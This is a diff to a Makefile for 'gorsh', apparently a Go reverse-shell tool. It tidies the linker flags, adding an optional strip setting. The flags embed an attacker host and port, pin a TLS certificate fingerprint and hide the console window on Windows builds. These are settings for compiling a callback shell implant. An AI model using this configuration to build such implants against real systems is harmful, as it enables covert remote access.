@@ -12,14 +12,10 @@ SRC=gorsh.go
 
 STRIP=
 #STRIP=-s
-
 SUDO=sudo
 # SUDO=
-
-PATIENCE:="Please be patient, the mingw 64-bit toolchain must be installed via your package manager ..."
-
-LINUX_LDFLAGS=--ldflags "-w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"
-WIN_LDFLAGS=--ldflags "-w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui"
+LINUX_LDFLAGS=--ldflags "$(STRIP) -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"
+WIN_LDFLAGS=--ldflags "$(STRIP) -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui"
 
 all: clean depends shell
 
